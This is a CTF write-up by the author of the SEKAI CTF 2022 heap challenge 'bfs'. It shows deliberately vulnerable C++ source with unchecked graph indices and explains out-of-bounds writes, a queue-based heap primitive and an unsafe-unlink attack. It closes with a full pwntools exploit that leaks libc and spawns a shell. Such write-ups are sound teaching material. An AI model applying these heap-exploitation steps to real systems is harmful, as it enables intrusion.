---
layout: post
title:  "SEKAI CTF 2022 bfs writeup"
description: "I cant believe my chall was blooded last"
permalink: /posts/sekai-ctf-2022-bfs-writeup/
categories: writeup
---

_Untuk bahasa Indonesia, silakan klik link [ini](#bahasa-indonesia)_

## English
Last weekend, me and my team [Project Sekai](https://twitter.com/ProjectSEKAIctf) organized our first CTF! Incredible work by everyone in the team, which resulted in a smooth 48 hour CTF. Small infra issues at the start, and some challenges being a bit too hard than what we were expecting, but being our first CTF, I think we did amazing!!!

Now, for this CTF, I contributed 1 challenge, pwn ofc. sahuang asked for a heap challenge, and he told me to make it as hard as I like. And well... it became the last blooded challenge in the CTF xD. Very shocked cause I didnt think it was that hard, but just goes to show when your fellow testers fail to solve it... it might be a bit hard xD

### The challenge
If you want to download the challenge files, every challenge is kept in this [github repository](https://github.com/project-sekai-ctf/sekaictf-2022)

The challenge I made was a c++ binary, that accepts a graph in the form of an edge list, and uses bfs to find the shortest path between two nodes in the graph. To spice things up, I purposefully made the chall feel like an ICPC problem, so no unimportant output. Here's an example:

![Error](/assets/images/Sekai_CTF_2022_bfs/1.png)

0-indexed though, eh thats fine. Explanation of the input: The first line is the number of testcases, for each testcase, the first like is the number of nodes (_N_) and the number of edges  (_K_). The next _K_ lines is the graph in edge list form, and the last line is the to and from nodes. I was inspired to make this chall from 2 factors:

1. an algorithm pwn chall is a specialty of the legend Fariskhi Vidyan, so I wanted to try to make one too
2. many people have said heapnotes are boring

> Feel free stop here and try the challenge first! It took 44 hours before first blood on this chall, maybe you can do it faster!

<br>

### The bug
There are many bugs in this chall, the main one being the fact that there are no checks on the integers we input! Since all the important arrays are statically allocated, we can access out of bounds, and they are located in the heap!

bugs. everywhere.
```c++
int main(int argc, char const *argv[])
{
    init();
    std::string choice;
    uint q, n,k;
    uint from, dest, crawl;
    std::cin >> q;
    for (uint l = 0; l < q; l++)
    {
        std::cin >> n >> k;
        if(n > MAX_NUMBER_OF_NODES) {
            exit(0);
        }
        for (size_t i = 0; i < n; i++)
            for (size_t j = 0; j < n; j++)
                adj_matrix[i*MAX_NUMBER_OF_NODES + j] = 0;
        for (size_t i = 0; i < n; i++)
            vis[i] = 0;
        for (size_t i = 0; i < k; i++)
        {
            std::cin >> from >> dest; // integers not checked
            adj_matrix[from*MAX_NUMBER_OF_NODES + dest]++; // out of bounds increment!
            adj_matrix[dest*MAX_NUMBER_OF_NODES + from]++; // out of bounds increment!
        }
        std::cin >> from >> dest; // integers not checked
        bfs(from, dest, n);
        crawl = dest;
        std::cout << "Testcase #" << l << ": ";
        while(parent[crawl] != crawl)   {
            std::cout << crawl << " ";
            crawl = parent[crawl];  // out of bounds read!
        }
        std::cout << crawl << std::endl;
    }
    return 0;
}
```

Well, even if we have an out of bounds, thats not the end of it, we still need to get a shell. How can we do that, if there are no mallocs/frees to abuse? Well my good lad, there are!

There is a second bug in the bfs algorithm itself

```c++
void bfs(uint from, uint dest, uint n)  {
    uint tmp = 0;
    parent[from] = from;
    q.push(from);
    vis[from] = 1;
    while(!q.empty())   {
        tmp = q.front();
        q.pop();
        for (int i = 0; i < n; i++) {
            if(adj_matrix[tmp*MAX_NUMBER_OF_NODES + i] != 0 && vis[i] != 1) {
                vis[i] = 1;
                parent[i] = tmp;
                q.push(i);
                if (i == dest)  // We didnt empty out the queue for the next testcase :scream:
                    return;
            }
        }
    }
    return;
}
```
This is important, because of how queue is implemented. I dont really know how it fully works, but by just exploring in gdb, I found there are two pointers in the queue metadata that point to the front and back of the queue. The metadata of the queue is saved in bss, but the actually data is saved in the heap! Now, obviously the queue doesnt have infinite data, so how big is it? From my exploration, the queue allocated a chunk of size 0x200 (0x210 with chunk header). This means if we push 512 values into the queue, we allocate a new chunk! This is because the front pointer reaches the end of the chunk. Consequently, if we pop 512 values, the chunk will be freed.

Together with the bug, we can carefully input specific values so that we can free and allocate whenever we want.

> Also consequently, my algorithm will input wrong answer for alot of testcases xD

<br>

From here, its possible to use the existing bugs to do a tcache poisoning attack onto the got (the binary is no PIE and partial RELRO). This is how both of the teams that solved it during the CTF did it.

### What did I do?
There is a third bug!!! Note that the parent array isnt emptied either!

```c++
std::cout << "Testcase #" << l << ": ";
while(parent[crawl] != crawl)   {   // Wait.. parent wasnt cleared???
    std::cout << crawl << " ";
    crawl = parent[crawl];  // out of bounds read and possible read on old values!
}
std::cout << crawl << std::endl;
```

From here, I used one of my favorite heap exploits, unsafe unlink!

This is how:

* Setup the parent array so that the first 6 double words are how you would setup a unsafe unlink attack
* Allocated some chunks after adj_matrix using the queue
* Use the OOB increment to change the header of the chunks so that the prev inuse bit is 0, the size is larger than 0x410 (so no tcache issues), and set the prev_size too. Oh you also need to set the size so that it passes any house of spirit checks, I'll leave that as an exercise.
* Unlink!

This is actually tough, and it required me to restructure my exploit a couple times. Anything can break at any point.

### Final step
Parent array now points to 3 double words before itself. Using the parent array itself, we can change it so that it points to the got. From there, we can leak any glibc value in the got. To pop a shell, we can use the parent array yet again to change the `operator<<` function to system, and change the first double word in cout struct (also in bss btw) to /bin/sh. The next call to `operator<<` will pop a shell!

Full exploit:

```py
#!/usr/bin/python3
from pwn import *

p = remote("challs.ctf.sekai.team", 4004)

p.sendline("100")

# Setup parent array
p.sendline(b"""256 6
0 33
33 8
0 17
17 9
0 1
1 10
0 255""")

p.sendline(b"""256 12
0 192
192 16
0 115
115 17
0 64
64 18
0 200
200 24
0 115
115 25
0 64
64 26
0 255""")

# Allocate a bunch of chunks
for j in range(48, 48+8):
    to_send = """256 207
    """
    for i in range(48, j):
        to_send += """{} {}
        """.format(j, i)
    for i in range(j+1, 256):
        to_send += """{} {}
        """.format(j, i)
    to_send += """{} 255""".format(j)
    p.sendline(to_send)


# Change header of a chunk and set the prev_size so that it points to just after parent array
to_send = b"""256 86
""" + b"""272 16
"""*0x20 + b"""272 17
"""*0x11 + b"""272 18
"""*0x1 + b"""272 25
"""*0x4 + b"""272 24
"""*0x1f + b"""255 90
255 90"""
p.sendline(to_send)

# Free the chunk
to_send = """256 1
255 90
255 90"""
p.sendline(to_send)
p.sendline(to_send)
p.sendline(to_send)

# Unlink should be successful, however the first byte is not null! This will cause an infinite loop (due to how i coded the algorithm)
# This part changes the first byte to null
to_send = b"""256 37
""" + b"""274 31
"""*35 + b"""0 0
""" + b"""255 90
255 90"""
p.sendline(to_send)


# Now we change the parent array to got
p.sendline(b"""256 2
0 95
95 24
0 255""")

p.sendline(b"""256 2
0 112
112 122
0 255""")

# Leak alarm in glibc
leak = 0
for i in range(118, 112, -1):
    p.sendline("""256 1
    240 241
    0 {}""".format(i))
    p.recvuntil(str(i) + " ")
    next_byte = int(p.recvuntil(" "))
    leak <<= 8
    leak += next_byte
print(hex(leak))
libc_base = leak - 0xea5b0
system = libc_base + 0x50d60
byte_system = p64(system)

# Change operator<< to system and first double word in cout struct to /bin/sh, and pop shell!
p.sendline("""256 23
0 {}
{} 1
0 {}
{} 2
0 {}
{} 3
0 {}
{} 4
0 47
47 225
0 98
98 226
0 105
105 227
0 110
110 228
0 47
47 229
0 115
115 230
0 104 
104 231
0 232
0 255""".format(byte_system[0], byte_system[0], byte_system[1], byte_system[1], byte_system[2], byte_system[2], byte_system[3], byte_system[3]))


p.interactive()
```

### Final words
Im glad everyone had fun in the CTF, next year ill make even better challenges!!! (browser pwn? kernel pwn? another algo pwn? who knows!)

Thanks again for playing SEKAI CTF 2022!!!!

<br>
<br>
<br>

## Bahasa Indonesia
TODO

<br>
<br>
<br>